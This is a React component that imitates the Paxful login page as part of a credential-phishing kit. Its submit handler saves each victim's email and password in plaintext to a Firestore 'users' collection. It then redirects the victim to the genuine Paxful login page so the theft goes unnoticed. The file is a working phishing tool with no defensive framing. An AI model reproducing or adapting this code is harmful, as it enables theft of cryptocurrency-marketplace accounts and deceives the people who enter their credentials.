
import { useState } from "react";
import "../App.css";
import { collection,addDoc } from "firebase/firestore";
import {db} from './config/firebase'
import { Input } from "../components/ui/input";
import { Button } from "./ui/button";
import { redirect } from "react-router-dom";
import { useNavigate } from "react-router-dom";
function App() {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
const AddData = async(formData)=>{
  try {
    const docRef = await addDoc(collection(db, "users"), {
      email: formData.email,
      password: formData.password,
    });
    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    await AddData(formData);
    window.location.href = 'https://accounts.paxful.com/login/';

  };

  return (
    <div className=" mt-10">
      <div className="login-box w-[22rem] lg:w-full">
        <form
          className="login-form"
          onSubmit={(e) => handleSubmit(e)}
        >
          <div className="form-group">
            <label htmlFor="email">Your Phone or Email</label>
            <Input
              type="email"
              id="email"
              name="email"
              required
              value={formData.email}
              onChange={handleChange}
            />
          </div>
          <div className="form-group py-4">
            <label htmlFor="password">Your Password</label>
            <Input
              type="password"
              id="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              required
            />
          </div>
          <Button type="submit" className="w-full flex justify-start">
            Log in
          </Button>
        </form>
        <p id="error" className="error-message"></p>
        <hr className="mt-6 border border-solid border-gray-200"/>
        <p className="text-sm pt-4">
          New on Paxful? <a className="text-blue-500" href="https://paxful.com/register?locale=en">Create an Account</a>
        </p>
      </div>
    </div>
  );
}

export default App;